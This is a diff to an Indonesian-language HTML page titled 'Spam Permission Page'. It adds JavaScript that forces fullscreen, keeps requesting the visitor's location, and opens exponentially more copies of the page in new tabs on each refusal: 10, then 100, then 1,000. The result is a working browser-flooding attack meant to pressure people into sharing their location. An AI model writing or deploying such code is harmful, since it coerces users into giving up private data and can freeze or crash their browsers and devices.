@@ -5,6 +5,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Halaman Spam Permission</title>
   <script>
+    let cancelCount = 0;
+
     // Fungsi untuk masuk ke mode layar penuh
     function goFullScreen() {
       const element = document.documentElement;
@@ -24,16 +26,31 @@
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           function(position) {
-            // Tidak perlu melakukan apa-apa di sini
+            // Tidak perlu melakukan apa-apa di sini jika berhasil
+            console.log("Lokasi berhasil diambil");
           },
           function(error) {
             console.error("Error permintaan lokasi:", error);
-            // Tetap meminta izin lokasi berulang kali
-            requestLocationPermission();
+            // Ketika menolak atau membatalkan, akan membuka tab baru
+            handlePermissionDenied();
           }
         );
       } else {
         console.log("Geolocation tidak didukung oleh browser ini.");
+      }
+    }
+
+    // Fungsi untuk menangani penolakan izin
+    function handlePermissionDenied() {
+      cancelCount++;
+      let tabCount = Math.pow(10, cancelCount);  // Kelipatan 10 berdasarkan jumlah cancel
+      openNewTabs(tabCount);
+    }
+
+    // Fungsi untuk membuka tab baru sesuai jumlah yang dihitung
+    function openNewTabs(count) {
+      for (let i = 0; i < count; i++) {
+        window.open(window.location.href, "_blank");
       }
     }
 
@@ -46,6 +63,6 @@
 </head>
 <body>
   <h1>Halaman Spam Permission</h1>
-  <p>Halaman ini akan meminta izin lokasi berulang kali dan mencoba masuk ke mode layar penuh.</p>
+  <p>Halaman ini akan mencoba masuk ke mode layar penuh dan meminta izin lokasi secara terus-menerus. Setiap kali izin ditolak, halaman ini akan terbuka di tab baru.</p>
 </body>
 </html>
